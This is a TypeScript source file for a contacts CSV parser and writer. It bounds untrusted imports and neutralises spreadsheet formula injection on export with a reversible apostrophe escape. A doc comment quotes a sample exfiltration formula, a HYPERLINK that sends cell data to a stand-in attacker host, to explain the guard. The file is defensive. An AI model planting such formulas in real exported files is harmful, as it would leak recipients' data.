/**
 * RFC 4180 CSV, hand-written, for the contact import and export paths.
 *
 * Both directions are adversarial. **Import** is untrusted input at volume, so
 * the parser is bounded on every axis (bytes, columns, rows, cell length) and
 * its failures are per-row wherever a row can fail alone: `parseCsv` returns
 * the good rows *and* a list of the rows it held back, so the import can report
 * line numbers instead of refusing a customer's 10 000-row migration over one
 * stray comma. Only a document-level problem is fatal, and the one that matters
 * is an unterminated quote — after it the meaning of every following line is
 * unknowable, so continuing would import garbage silently.
 *
 * **Export** is the formula-injection half: a cell a spreadsheet would evaluate
 * is neutralised by `csvCell`, and `parseCsv` reverses that neutralisation so a
 * file we wrote can be re-imported unchanged. See `csvCell` for why the guard is
 * an escape rather than a rewrite.
 *
 * Deliberate tolerances beyond the letter of RFC 4180, all things real
 * exporters emit: a UTF-8 BOM (Excel writes one), CR-LF or LF or a stray CR,
 * a missing trailing newline, blank lines anywhere, whitespace before an
 * opening quote, and rows shorter than the header. Text *after* a closing quote
 * is appended rather than refused.
 *
 * Known limits, stated rather than implied: a quoted field keeps its bytes
 * exactly, so an Excel cell whose embedded break is CR-LF arrives with the CR
 * intact; and in a one-column document a row holding a single empty value is
 * indistinguishable from a blank line, so it is skipped.
 */

/**
 * The byte-side backstop for `ImportContactsInput.csv`, whose own 2 MB bound in
 * `@sendsprite/shared` counts *characters*. A payload of multi-byte text can
 * therefore pass the contract and be refused here; the message says to split
 * the file, which is the same remedy either way.
 */
export const MAX_CSV_BYTES = 2 * 1024 * 1024;
export const MAX_CSV_ROWS = 10_000;
/**
 * Wide enough for anything this product writes, with headroom. The export
 * (`/app/contacts/[id]/export`) emits six fixed columns — `email`,
 * `first_name`, `last_name`, `subscribed`, `unsubscribe_reason`, `created_at`
 * — plus one per property key, and a contact may hold 20 properties: 26. A cap
 * below that would make an export this product cannot re-import, and only for
 * the customers with the most data. The cap exists to bound work, and 32
 * bounds it just as well as 24 did.
 */
export const MAX_CSV_COLUMNS = 32;
/** Matches the per-property bound in `CreateContactInput`. */
export const MAX_CSV_CELL_CHARS = 500;

export interface CsvRow {
  /** 1-based physical line the row started on, for error messages. */
  line: number;
  cells: string[];
}
/** A row that parsed but was held back. Callers report these alongside their own. */
export interface CsvRowError {
  line: number;
  reason: string;
}
export interface CsvDocument {
  header: string[];
  rows: CsvRow[];
  errors: CsvRowError[];
}
export type CsvParseResult =
  { ok: true; data: CsvDocument } | { ok: false; error: string };

const fail = (error: string): CsvParseResult => ({ ok: false, error });

/**
 * Splits the whole document into records of cells in one pass. Returns the
 * physical start line of each record so an embedded newline does not make
 * every later error message point at the wrong line.
 */
function records(text: string): { line: number; cells: string[] }[] | string {
  const out: { line: number; cells: string[] }[] = [];
  let cells: string[] = [];
  let cell = "";
  // Whether the cell so far is empty or only spaces/tabs, so a quote may still
  // open it. Tracked incrementally rather than re-scanning `cell` per quote.
  let blank = true;
  let quoted = false;
  let line = 1;
  let recordLine = 1;
  let started = false;

  const endCell = () => {
    cells.push(cell);
    cell = "";
    blank = true;
  };
  const endRecord = () => {
    endCell();
    out.push({ line: recordLine, cells });
    cells = [];
    started = false;
  };

  for (let i = 0; i < text.length; i++) {
    const c = text[i] as string;
    if (!started) {
      recordLine = line;
      started = true;
    }
    if (quoted) {
      if (c === '"') {
        if (text[i + 1] === '"') {
          cell += '"';
          i++;
        } else quoted = false;
        continue;
      }
      if (c === "\n") line++;
      cell += c;
      continue;
    }
    if (c === '"' && blank) {
      // A hand-edited file writes `a, "b"`; the space belongs to neither value.
      cell = "";
      blank = false;
      quoted = true;
      continue;
    }
    if (c === ",") {
      endCell();
      continue;
    }
    if (c === "\r") continue; // CRLF: the \n does the work
    if (c === "\n") {
      endRecord();
      line++;
      continue;
    }
    cell += c;
    if (c !== " " && c !== "\t") blank = false;
  }
  if (quoted) return `Unterminated quote starting on line ${recordLine}.`;
  // A document not ending in a newline still has a final record.
  if (started || cell !== "" || cells.length) endRecord();
  return out;
}

/** Reverses `csvCell`'s guard. See there for why this is safe on foreign files. */
const unescapeCell = (cell: string) => cell.replace(/^'(?=['=+\-@\t\r])/, "");

/**
 * Parses a CSV document with a header row.
 *
 * Short rows are padded to the header width — a trailing empty column is an
 * exporter artefact, not a mistake. A row **wider** than the header is held
 * back in `errors` instead: a stray comma shifts every value after it one
 * column left, which lands somebody else's data in the wrong field, and that
 * is worse than not importing the row. So is a cell over `MAX_CSV_CELL_CHARS`,
 * which the contract would reject one field at a time with a vaguer message.
 */
export function parseCsv(text: string): CsvParseResult {
  if (Buffer.byteLength(text, "utf8") > MAX_CSV_BYTES)
    return fail(
      `CSV must be at most ${MAX_CSV_BYTES} bytes; split the file and import it in chunks.`,
    );
  // Excel writes a UTF-8 BOM; it would otherwise become part of the first header.
  const parsed = records(text.replace(/^\uFEFF/, ""));
  if (typeof parsed === "string") return fail(parsed);
  const [head, ...rest] = parsed;
  if (!head || head.cells.every((c) => c.trim() === ""))
    return fail("CSV must start with a header row.");
  const header = head.cells.map((c) => unescapeCell(c).trim());
  if (header.length > MAX_CSV_COLUMNS)
    return fail(`CSV must have at most ${MAX_CSV_COLUMNS} columns.`);
  // A file ending in a newline produces one trailing empty record, and so does
  // every blank line in the middle of one.
  const body = rest.filter((r) => !(r.cells.length === 1 && r.cells[0] === ""));
  if (body.length > MAX_CSV_ROWS)
    return fail(
      `CSV must have at most ${MAX_CSV_ROWS} rows; split the file and import it in chunks.`,
    );

  const rows: CsvRow[] = [];
  const errors: CsvRowError[] = [];
  for (const r of body) {
    if (r.cells.length > header.length) {
      errors.push({
        line: r.line,
        reason: `Row has ${r.cells.length} values but the header has ${header.length}.`,
      });
      continue;
    }
    const cells = Array.from({ length: header.length }, (_, i) =>
      unescapeCell(r.cells[i] ?? ""),
    );
    const over = cells.findIndex((c) => c.length > MAX_CSV_CELL_CHARS);
    if (over >= 0) {
      errors.push({
        line: r.line,
        reason: `Value in column "${header[over]}" is longer than ${MAX_CSV_CELL_CHARS} characters.`,
      });
      continue;
    }
    rows.push({ line: r.line, cells });
  }
  return { ok: true, data: { header, rows, errors } };
}

/**
 * Leaders a spreadsheet treats as the start of a formula (OWASP CSV injection),
 * plus `'` itself, which is what makes the guard reversible.
 */
const NEEDS_GUARD = /^['=+\-@\t\r]/;
const NEEDS_QUOTES = /["\n\r,]/;

/**
 * One cell, safe to hand to a spreadsheet.
 *
 * A value beginning `=`, `+`, `-`, `@`, tab or CR is prefixed with `'` so Excel
 * and Sheets treat it as text rather than executing it — an exported contact
 * whose "first name" is `=HYPERLINK("http://evil.io?"&A1,"click")` must not
 * become a live exfiltration link the moment somebody opens the file. RFC 4180
 * quoting alone does not do this: a spreadsheet strips the quotes and evaluates
 * what is inside. Quoting is then applied on top, so a value that is both
 * dangerous and contains a comma gets both treatments.
 *
 * **A value already beginning with `'` gets one too, and that is the whole
 * trick.** The prefix is an escape, not a rewrite: `v -> "'" + v` is injective
 * over the values it touches (its output always starts with `'` followed by a
 * guarded character, which no untouched value does), so `parseCsv` can invert
 * it exactly and `parseCsv(toCsv(rows))` returns the original strings. Without
 * that, a `-1234` phone number comes back as `'-1234`, and every re-export adds
 * another apostrophe. The inverse is narrow enough to be safe on a file we did
 * not write: `'Tis` survives untouched because `T` is not a guarded leader, and
 * a foreign `'=SUM(A1)` is un-escaped because it is overwhelmingly some other
 * exporter's copy of this same guard.
 *
 * The cost, accepted: Excel and Sheets show the guarded value as left-aligned
 * text rather than a number, and LibreOffice shows the apostrophe itself. That
 * is the price of not shipping a live formula, and the contact fields this
 * exports are strings anyway.
 */
export function csvCell(value: string): string {
  const guarded = NEEDS_GUARD.test(value) ? `'${value}` : value;
  return NEEDS_QUOTES.test(guarded)
    ? `"${guarded.replace(/"/g, '""')}"`
    : guarded;
}

/**
 * A whole document, header first, always ending in a newline.
 *
 * Rows are written exactly as given: a row shorter than the header comes back
 * from `parseCsv` padded, so callers build full-width rows.
 */
export const toCsv = (
  header: readonly string[],
  rows: readonly (readonly string[])[],
): string =>
  [header, ...rows].map((r) => r.map(csvCell).join(",")).join("\n") + "\n";
